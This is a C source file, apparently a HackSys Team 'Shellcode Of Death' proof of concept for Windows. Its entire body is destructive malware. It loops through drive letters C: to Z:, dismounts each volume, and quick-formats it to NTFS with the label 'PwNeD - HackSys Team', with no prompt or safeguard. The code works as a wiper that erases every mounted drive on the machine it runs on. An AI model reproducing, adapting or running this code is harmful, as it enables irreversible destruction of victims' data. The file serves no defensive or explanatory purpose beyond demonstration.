#include <windows.h>
#include <WinIoCtl.h>
#define _UNICODE 1

/* 
                  _     __             _____                     
  /\  /\__ _  ___| | __/ _\_   _ ___  /__   \___  __ _ _ __ ___  
 / /_/ / _` |/ __| |/ /\ \| | | / __|   / /\/ _ \/ _` | '_ ` _ \ 
/ __  / (_| | (__|   < _\ \ |_| \__ \  / / |  __/ (_| | | | | | |
\/ /_/ \__,_|\___|_|\_\\__/\__, |___/  \/   \___|\__,_|_| |_| |_|
                           |___/                                 

                                http://hacksys.vfreaks.com/
                                  hacksysteam@hotmail.com

Author:
       
    Ashfaq Ansari 
    hacksysteam@hotmail.com
	
Thanks:

	Mark Russinovich (Systems Internals - http://www.sysinternals.com)

Module Name:
    
    Shellcode Of Death

Abstract:
    
    This is a proof of concept shellcode in C format.

IDE: 
     
    Dev-C++ 4.9.9.2 (Windows XP SP3)
        
Compiler: 
          
    gcc 3.4.2

*/

typedef enum {
	PROGRESS,
	DONEWITHSTRUCTURE,
	UNKNOWN2,
	UNKNOWN3,
	UNKNOWN4,
	UNKNOWN5,
	INSUFFICIENTRIGHTS,
	UNKNOWN7,
	VOLUME_IN_USE,
	CANT_QUICK_FORMAT,
	UNKNOWNA,
	DONE,
	UNKNOWNC,
	UNKNOWND,
	OUTPUT,
	STRUCTUREPROGRESS
} CALLBACKCOMMAND;

typedef BOOLEAN (__stdcall *PFMIFSCALLBACK)( CALLBACKCOMMAND Command,
                                             DWORD SubAction,
                                             PVOID ActionInfo ); 

typedef VOID (__stdcall *PFORMATEX)( PWCHAR DriveRoot,
                                     DWORD MediaFlag,
                                     PWCHAR Format,
                                     PWCHAR Label,
                                     BOOL QuickFormat,
                                     DWORD ClusterSize,
                                     PFMIFSCALLBACK Callback );

PFORMATEX   FormatEx;

BOOLEAN __stdcall FormatExCallback( CALLBACKCOMMAND Command,
                                    DWORD Modifier,
                                    PVOID Argument )
{
	return TRUE;
}


int main( )
{
	int i;
	int res;
	char szVolumeAccessPath[] = "\\\\.\\X:";
	DWORD dwRet;
	HANDLE hVolRead;
	PWCHAR DriveList[] = {L"C:", L"D:", L"E:", L"F:", L"G:", L"H:", L"I:",
                          L"J:", L"K:", L"L:", L"M:", L"N:", L"O:", L"P:",
                          L"Q:", L"R:", L"S:", L"T:", L"U:", L"V:", L"W:",
                          L"X:", L"Y:", L"Z:"};
	WCHAR  RootDirectory[MAX_PATH];

	LoadLibrary( "fmifs.dll" );
	FormatEx = (void *) GetProcAddress(GetModuleHandle("fmifs.dll"),
                                       "FormatEx");

	for ( i = 0; i <= 23; i++){

		wcscpy( RootDirectory,DriveList[i] );	
		RootDirectory[2] = L'\\';
		RootDirectory[3] = (WCHAR) 0;
		szVolumeAccessPath[4] = RootDirectory[0];
		
		//Get the handle to the drive
		hVolRead = CreateFile(szVolumeAccessPath,
			                  GENERIC_READ | GENERIC_WRITE, 
							  FILE_SHARE_READ | FILE_SHARE_WRITE, 
							  NULL, 
							  OPEN_EXISTING, 
							  0, 
							  NULL);
		
		// dismount the file system
		// no need to lock the volume
        // once dismounted all the handles will be invalid
		res = DeviceIoControl(hVolRead,
                              FSCTL_DISMOUNT_VOLUME,
                              NULL,
                              0,
                              NULL,
                              0,
                              &dwRet,
                              NULL);
		
		// Close the handle
		CloseHandle(hVolRead);
		
		//Format the drive
		//Proceed to next drive if error occurs
		FormatEx(RootDirectory,
                 0xC,
                 L"NTFS",
                 L"PwNeD - HackSys Team",
                 TRUE,
                 4096,
                 FormatExCallback );
        
		Sleep(200);
	}
	return 0;
}
